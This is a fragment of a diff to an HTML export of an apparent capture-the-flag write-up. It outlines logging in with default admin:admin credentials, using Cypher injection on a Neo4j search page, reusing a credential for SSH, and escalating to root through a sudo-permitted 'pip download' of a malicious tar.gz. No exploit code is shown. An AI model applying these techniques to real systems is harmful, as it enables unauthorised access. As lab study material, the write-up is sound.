 There is a simple web app and you can find the default credentials are admin:admin. Navigating around, we can see a search page, and based on the fact we know Neo4j is running, Cypher injection is the correct route.
 I came to realize this when fuzzing the search page for <a href="20221213185522-sql_injection.html#ID-81d62666-4ce8-4244-b498-739a680f9673">SQL Injection</a>.
@@ -883,9 +883,9 @@ This credential also works with John on the Gogs and SSH.
 </div>
 </div>
 
-<div id="outline-container-org344ec04" class="outline-3">
-<h3 id="org344ec04">root.</h3>
-<div class="outline-text-3" id="text-org344ec04">
+<div id="outline-container-orgb49ec4d" class="outline-3">
+<h3 id="orgb49ec4d">root.</h3>
+<div class="outline-text-3" id="text-orgb49ec4d">
 <p>
 Always check your privileges with <code>sudo -l</code>. In this case, running pip download as root can execute code when in the tar.gz format.
 </p>
@@ -934,7 +934,7 @@ My advice is to have a directory for the tools then use <code>python -m http.ser
 <div id="postamble" class="status">
 <p class="author">Author:  (<a href="mailto:unseen@flake">unseen@flake</a>)</p>
 <p class="date">Date: </p>
-<p class="creator"><a href="https://www.gnu.org/software/emacs/">Emacs</a> 28.2 (<a href="https://orgmode.org">Org</a> mode 9.6.1)</p>
+<p class="creator"><a href="https://www.gnu.org/software/emacs/">Emacs</a> 28.2 (<a href="https://orgmode.org">Org</a> mode 9.5.5)</p>
 <p class="validation"></p>
 </div>
 </body>
